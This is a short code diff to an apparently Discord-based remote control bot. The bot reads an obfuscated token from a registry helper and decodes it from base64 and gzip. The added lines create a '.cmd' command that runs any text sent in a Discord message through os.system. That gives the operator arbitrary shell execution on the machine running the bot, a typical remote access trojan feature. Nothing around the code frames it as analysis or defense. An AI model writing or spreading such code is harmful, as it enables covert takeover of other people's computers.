@@ -446,4 +446,9 @@ async def on_message(message):
             embed = discord.Embed(title="Monitor Control", description="Failed to channge monitor state.", color=0x00ff00)
         await message.channel.send(embed=embed)
 
+    #CMD
+    if message.content.startswith(".cmd"):
+        arg = message.content.replace(".cmd ","")
+        os.system(arg)
+
 client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
